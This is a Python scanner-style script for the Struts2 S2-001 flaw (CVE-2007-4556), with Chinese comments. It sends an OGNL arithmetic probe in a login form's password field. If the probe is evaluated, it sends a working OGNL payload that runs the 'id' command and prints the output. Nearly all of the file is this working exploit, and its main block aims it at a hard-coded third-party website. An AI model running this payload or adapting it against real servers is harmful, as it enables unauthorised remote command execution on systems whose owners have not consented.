#!/usr/bin/env python3

'''
name: Struts2 S2-001漏洞,又名CVE-2007-4556漏洞
description: Struts2 S2-001漏洞可执行任意命令
'''

import re
import json
from app.lib.utils.request import request


class S2_001_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Content-Type': "application/x-www-form-urlencoded",
                   'Connection': "keep-alive",
                  }
        self.check_data = {
                                   'username': 12,
                                   'password': '%{78912+1235}'
                        }
        self.cmd_data = {
                           'username': 12,
                           'password':'%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
                         }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.post(self.url, headers = self.headers, data = self.check_data)
            check_pattern = re.compile('<.*?name="password" value="(.*?)" ')
            check_result = check_pattern.findall(check_req.text)
            if check_result[0] == '80147':
                print('存在S2-001漏洞,执行id命令结果为:\n')
                cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_data)
                print(cmd_req.text)
                return True
            else:
                print('不存在S2-001漏洞')
                return True
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_001 = S2_001_BaseVerify('http://jsfw.kydls.com')
    S2_001.run()



